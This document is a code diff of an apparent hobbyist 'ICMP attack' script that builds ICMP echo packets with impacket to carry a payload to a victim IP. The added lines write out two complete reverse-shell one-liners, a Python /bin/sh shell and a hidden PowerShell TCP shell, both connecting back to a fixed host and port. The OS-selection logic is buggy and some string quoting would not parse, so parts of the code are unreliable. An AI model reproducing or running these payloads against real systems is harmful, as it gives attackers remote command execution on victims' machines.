@@ -1,56 +1,44 @@
-from encodings import utf_8
 from impacket import ImpactDecoder
 from impacket import ImpactPacket
 import socket
-ipheader = ImpactPacket.IP()
-icmpheader = ImpactPacket.ICMP()
-payload = "Standard Reverse Shell"
+import sys
 
-def welcome():
-    #Dependency Check
-    try: 
-        from impacket import ImpactDecoder
-    except ImportError:
-        print("Impacket library is missing (Run", "pip install impacket)")
-        exit(1)
-    #Welcome Prompt
-    print('\n', "Welcome to ICMP Attack Suite!", '\n', "ICMP Parameters", '\n', sep='\n')
-    setICMP()
+#---------------------------------------#
+#---Syntax check---#
+if len(sys.argv) < 3:
+    print("Syntax: python icmpattack.py <Source IP> <Destination IP")
+    sys.exit(1)
 
-def payloads():
-    print("Payload Selection", '\n', "1. Reverse Shell", "2. OS Fingerprinting", "3. Ping", "4. Back to Main Menu", '\n', sep='\n')
-    pl = input("Selection: ")
-    if (pl == "1"):
-        print('\n', "Select OS", '\n', "1. POSIX System", "2. Windows System", '\n', sep='\n')
-        plsel = input("Selection: ")
-        if (plsel == "1"):
-            print("Python Reverse Shell Command for Linux")
-        elif (plsel == "2"):
-            print("Python Reverse Shell Command for Windows")
-        else:
-            print("Invalid Option")
-    else:
-        print("Invalid Option")
-    payload_b = bytes(payload, encoding="utf_8")
-    icmpheader.contains(ImpactPacket.Data(payload_b))
-    ipheader.contains(icmpheader)
-    print(ipheader)
+host = sys.argv[1]
+vic = sys.argv[2]
 
-def exploit():
-    
+#----------------------------------------#
+#---IP Packet Initialization---#
+IP = ImpactPacket.IP()
+IP.set_ip_dst(vic)
+IP.set_ip_src(host)
 
-def setICMP():
-    dst = input("Enter Victim IP address: ")
-    print('\n')
-    host = socket.gethostname()
-    src = socket.gethostbyname(host)
-    ipheader.set_ip_dst(dst)
-    ipheader.set_ip_src(src)
-    icmpheader.set_icmp_type(icmpheader.ICMP_ECHO)
-    payloads()
-    
-def main():
-    welcome()
+#---ICMP Initialization---#
+ICMP = ImpactPacket.ICMP()
+ICMP.set_icmp_type(ICMP.ICMP_ECHO)
 
-if __name__ == "__main__":
-    main()
+#---Payload Definition---#
+pl_lin = "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.195.100",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+
+pl_win = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.21.195.100",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+#---OS Selection---#
+sel = input("Select Victim OS (L = Linux / W = Windows ")
+if(sel == 'L' or 'l'):
+    pl_data = pl_lin
+elif(sel == 'W' or 'w'):
+    pl_data = pl_win
+else:
+    print("Invalid Option")
+    exit(1)
+
+#---Payload Byte Formatting--#
+pl_data_b =  pl_data.encode()
+PL_DATA = bytearray(pl_data_b)
+print("Selected Payload: ", PL_DATA)
+
